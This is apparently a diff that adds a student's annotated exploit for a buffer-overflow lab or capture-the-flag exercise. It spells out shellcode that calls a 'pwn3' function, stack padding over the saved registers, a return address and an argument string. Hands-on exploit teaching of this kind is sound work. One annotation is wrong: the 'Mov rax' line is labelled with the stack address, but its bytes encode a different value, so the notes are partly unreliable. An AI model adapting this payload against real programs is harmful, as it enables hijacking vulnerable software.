@@ -1,2 +1,16 @@
 Q. Your exploit explanation below.
 
+48 c7 c7 65 00 00 00        Mov rdi, 101 (or 0x65)
+48 be 90 ff e7 ff ff        Mov rsi, 0x7fffffe7ff90 (Address of the string arg2)
+7f 00 00                    ""
+48 c7 c0 e5 18 40 00        Mov rax, 0x7fffffe7ff90 (Address of pwn3)
+ff d0                       Call rax.
+36 36 36 36 36 36 36 36     Padding to fill buffer + alignment
+36 36 36 36 36 36           Padding to fill buffer
+36 36 36 36 36 36 36 36     "
+36 36 36 36 36 36 36 36     "
+36 36 36 36 36 36 36 36     Padding to fill r12 on stack
+36 39 36 36 36 36 36 36     Padding to fill rbp on stack
+40 ff e7 ff ff 7f 00 00     Address to instructions on line 3 (stack instr.)
+6c 33 33 74 68 34 78 30     The string argument l33th4x0rh3r3
+72 68 33 72 33 00           "
